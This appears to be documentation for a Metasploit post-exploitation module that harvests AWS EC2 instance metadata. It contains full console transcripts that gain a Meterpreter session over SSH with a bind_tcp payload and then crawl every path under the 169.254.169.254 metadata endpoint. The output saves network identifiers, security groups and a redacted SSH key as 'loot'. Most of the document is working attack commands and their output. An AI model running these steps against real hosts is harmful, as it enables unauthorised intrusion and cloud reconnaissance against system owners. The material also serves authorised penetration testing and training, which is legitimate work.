## Vulnerable Application

  This module uses an existing session on an AWS EC2 instance to gather
  the metadata about the instance.  As such, any EC2 instance with `curl`
  is an applicable target.

## Verification Steps

  1. Get session
  2. Do `use post/multi/gather/aws_ec2_instance_metadata`
  3. Do `set SESSION <session id>`
  4. Do `run`
  5. See loot.

## Options

  Set `VERBOSE` to `true` if you would like the AWS EC2 instance metadata to be shown
  in addition to being stored.

## Scenarios

  Default, non-verbose mode:

  ```
  resource (msf.rc)> use exploit/multi/ssh/sshexec
  resource (msf.rc)> set PASSWORD test
  PASSWORD => test
  resource (msf.rc)> set USERNAME test
  USERNAME => test
  resource (msf.rc)> set PAYLOAD linux/x86/meterpreter/bind_tcp
  PAYLOAD => linux/x86/meterpreter/bind_tcp
  resource (msf.rc)> set RHOST 192.168.2.2
  RHOST => 192.168.2.2
  resource (msf.rc)> run -j
  [*] Exploit running as background job.
  resource (msf.rc)> sleep 10
  [*] Started bind handler
  [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
  [*] 192.168.2.2:22 - Sending stager...
  [*] Command Stager progress -  42.09% done (306/727 bytes)
  [*] Sending stage (1495599 bytes) to 192.168.2.2
  [*] Command Stager progress - 100.00% done (727/727 bytes)
  [*] Meterpreter session 1 opened (192.168.1.149:52075 -> 192.168.2.2:4444) at 2016-09-30 06:40:44 -0700

  resource (msf.rc)> use post/multi/gather/aws_ec2_instance_metadata
  resource (msf.rc)> set SESSION 1
  SESSION => 1
  resource (msf.rc)> run
  [*] Gathering AWS EC2 instance metadata
  [+] Saved AWS EC2 instance metadata to to /Users/jhart/.msf4/loot/20160930064126_default_192.168.2.2_aws.ec2.instance_509214.txt
  [*] Post module execution completed
  ```

  Non-default, verbose mode:

  ```
  resource (msf.rc)> use exploit/multi/ssh/sshexec
  resource (msf.rc)> set PASSWORD test
  PASSWORD => test
  resource (msf.rc)> set USERNAME test
  USERNAME => test
  resource (msf.rc)> set PAYLOAD linux/x86/meterpreter/bind_tcp
  PAYLOAD => linux/x86/meterpreter/bind_tcp
  resource (msf.rc)> set RHOST 192.168.2.2
  RHOST => 192.168.2.2
  resource (msf.rc)> run -j
  [*] Exploit running as background job.
  resource (msf.rc)> sleep 10
  [*] Started bind handler
  [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
  [*] 192.168.2.2:22 - Sending stager...
  [*] Command Stager progress -  42.09% done (306/727 bytes)
  [*] Sending stage (1495599 bytes) to 192.168.2.2
  [*] Command Stager progress - 100.00% done (727/727 bytes)
  [*] Meterpreter session 1 opened (192.168.1.149:52775 -> 192.168.2.2:4444) at 2016-09-30 06:55:54 -0700
  resource (msf.rc)> use post/multi/gather/aws_ec2_instance_metadata
  resource (msf.rc)> set SESSION 1
  SESSION => 1
  resource (msf.rc)> set VERBOSE true
  VERBOSE => true
  resource (msf.rc)> run
  [*] Fetching http://169.254.169.254/latest/meta-data/
  [*] Gathering AWS EC2 instance metadata
  [*] Fetching http://169.254.169.254/latest/meta-data/ami-id
  [*] Fetching http://169.254.169.254/latest/meta-data/ami-launch-index
  [*] Fetching http://169.254.169.254/latest/meta-data/ami-manifest-path
  [*] Fetching http://169.254.169.254/latest/meta-data/block-device-mapping/
  [*] Fetching http://169.254.169.254/latest/meta-data/block-device-mapping/ami
  [*] Fetching http://169.254.169.254/latest/meta-data/block-device-mapping/root
  [*] Fetching http://169.254.169.254/latest/meta-data/hostname
  [*] Fetching http://169.254.169.254/latest/meta-data/instance-action
  [*] Fetching http://169.254.169.254/latest/meta-data/instance-id
  [*] Fetching http://169.254.169.254/latest/meta-data/instance-type
  [*] Fetching http://169.254.169.254/latest/meta-data/local-hostname
  [*] Fetching http://169.254.169.254/latest/meta-data/local-ipv4
  [*] Fetching http://169.254.169.254/latest/meta-data/mac
  [*] Fetching http://169.254.169.254/latest/meta-data/metrics/
  [*] Fetching http://169.254.169.254/latest/meta-data/metrics/vhostmd
  [*] Fetching http://169.254.169.254/latest/meta-data/network/
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/device-number
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/interface-id
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/ipv4-associations/
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/ipv4-associations/192.168.2.2
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/local-hostname
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/local-ipv4s
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/mac
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/owner-id
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/public-hostname
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/public-ipv4s
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/security-group-ids
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/security-groups
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/subnet-id
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/subnet-ipv4-cidr-block
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/vpc-id
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/vpc-ipv4-cidr-block
  [*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/vpc-ipv4-cidr-blocks
  [*] Fetching http://169.254.169.254/latest/meta-data/placement/
  [*] Fetching http://169.254.169.254/latest/meta-data/placement/availability-zone
  [*] Fetching http://169.254.169.254/latest/meta-data/profile
  [*] Fetching http://169.254.169.254/latest/meta-data/public-hostname
  [*] Fetching http://169.254.169.254/latest/meta-data/public-ipv4
  [*] Fetching http://169.254.169.254/latest/meta-data/public-keys/
  [*] Fetching http://169.254.169.254/latest/meta-data/public-keys/0/
  [*] Fetching http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
  [*] Fetching http://169.254.169.254/latest/meta-data/reservation-id
  [*] Fetching http://169.254.169.254/latest/meta-data/security-groups
  [*] Fetching http://169.254.169.254/latest/meta-data/services/
  [*] Fetching http://169.254.169.254/latest/meta-data/services/domain
  [*] Fetching http://169.254.169.254/latest/meta-data/services/partition
  [+] AWS EC2 instance metadata
  {
    "ami-id": "ami-2d39803a",
    "ami-launch-index": "0",
    "ami-manifest-path": "(unknown)",
    "block-device-mapping": {
      "ami": "/dev/sda1",
      "root": "/dev/sda1"
    },
    "hostname": "ip-192.168.2.2.ec2.internal",
    "instance-action": "none",
    "instance-id": "i-16fffae",
    "instance-type": "t2.medium",
    "local-hostname": "ip-192.168.2.2.ec2.internal",
    "local-ipv4": "192.168.2.2",
    "mac": "aa:bb:cc:dd:ee:ff",
    "metrics": {
      "vhostmd": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    },
    "network": {
      "interfaces": {
        "macs": {
          "aa:bb:cc:dd:ee:ff": {
            "device-number": "0",
            "interface-id": "eni-1234ff",
            "ipv4-associations": {
              "192.168.2.2": "192.168.2.2"
            },
            "local-hostname": "ip-192.168.2.2.ec2.internal",
            "local-ipv4s": "192.168.2.2",
            "mac": "aa:bb:cc:dd:ee:ff",
            "owner-id": "186638383",
            "public-hostname": "ec2-192.168.2.2.compute-1.amazonaws.com",
            "public-ipv4s": "192.168.2.2",
            "security-group-ids": "sg-123a7",
            "security-groups": "launch-wizard-15",
            "subnet-id": "subnet-123453d",
            "subnet-ipv4-cidr-block": "192.0.2.0/24",
            "vpc-id": "vpc-fffffff",
            "vpc-ipv4-cidr-block": "192.0.0.0/16",
            "vpc-ipv4-cidr-blocks": "192.0.0.0/16"
          }
        }
      }
    },
    "placement": {
      "availability-zone": "us-east-1e"
    },
    "profile": "default-hvm",
    "public-hostname": "ec2-192.168.2.2.compute-1.amazonaws.com",
    "public-ipv4": "192.168.2.2",
    "public-keys": {
      "0": {
        "openssh-key": "ssh-rsa <...redacted...> jhart"
      }
    },
    "reservation-id": "r-8675309",
    "security-groups": "launch-wizard-15",
    "services": {
      "domain": "amazonaws.com",
      "partition": "aws"
    }
  }
  [+] Saved AWS EC2 instance metadata to to /Users/jhart/.msf4/loot/20160930065628_default_192.168.2.2_aws.ec2.instance_622503.txt
  [*] Post module execution completed
  ```
